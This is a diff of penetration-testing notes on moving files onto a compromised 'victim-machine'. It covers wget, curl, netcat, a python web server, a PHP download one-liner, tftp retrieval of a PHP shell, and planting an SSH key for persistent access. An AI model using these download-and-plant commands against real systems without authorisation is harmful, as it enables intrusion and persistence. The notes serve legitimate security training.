@@ -1,9 +1,28 @@
 # Transfering files
 
-## Linux
+### Set up av simple python webserver
+
+For the examples using curl  and wget we need to download from a web-server. THis is an easy way to set up a web-server. This command will make the entire folder available on port 9999.
+
+```
+python -m SimpleHTTPServer 9999
+```
+
+### Wget
+
+Now you can download any file with curl or wget
+```
+wget 192.168.1.102:9999/file.txt
+```
+
+### Curl
+
+```
+curl -O http://192.168.0.101/file.txt
+```
 
 ### Netcat
-The easiest way normally is to use netcat. 
+Another easy way is to use netcat. 
 
 If you can't have an interactive shell it might be risky to start listening on a on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because  that will destroy your sessions.
 
@@ -22,6 +41,7 @@ nc 192.168.1.102 4444 > file
 You can of course also do it the other way around:
 
 So on the victim-machine we run nc like this:
+
 ```bash
 nc -lvp 3333 > enum.sh
 ```
@@ -44,6 +64,32 @@ I have just run this command instead:
 nc -l 1234 > file.sh
 ```
 
+
+### With php
+
+```
+echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
+```
+
+### Ftp
+
+If you have access to a ftp-client to can of course just use that. 
+
+### Tftp
+
+On some rare machine we do not have access to nc and wget, and curl.. But we might have access to tftp. Some versions of tftp are run interactivly, like this:
+
+```
+$ tftp 192.168.0.101
+tftp> get myfile.txt
+```
+
+If we can't run it interactivly, for whatever reason, we can  do this trick:
+
+```
+tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
+```
+
 ### SSH
 If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.
 
@@ -51,7 +97,11 @@ So, in the /home/user dir you can find the hidden `.ssh` files by typing `ls -la
 Then you need to do two things.
 
 1. Create a new keypair.
-You do that with: `ssh-keygen -t rsa -C "your_email@example.com"` then you enter a name for the key.
+You do that with: 
+```
+ssh-keygen -t rsa -C "your_email@example.com"
+```
+then you enter a name for the key.
 
 Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey
 Enter passphrase (empty for no passphrase): 
@@ -74,32 +124,4 @@ Now you should be all set to log in using your private key. Like this
 ssh -i nameOfMyKey kim@192.168.1.103
 ```
 
-
-### Wget
-
-### Python server
-
-Fire up a simple server on the attacking box. This command will make the entire folder available.
-```
-python -m SimpleHTTPServer 9999
-```
-
-Now you can download any file with curl or wget
-```
-wget 192.168.1.102:9999/file.txt
-```
-
-### With php
-
-```
-echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
-```
-
-###ftp
-
-## Windows
-On windows machines we do not have access to tools like wget and netcat. But if you have a way to transfer files already we can transfer wget and other tools. Here are the minaries in kali.
-
-**/usr/share/windows-binaries
-/usr/share/doc/windows-binaries**
 
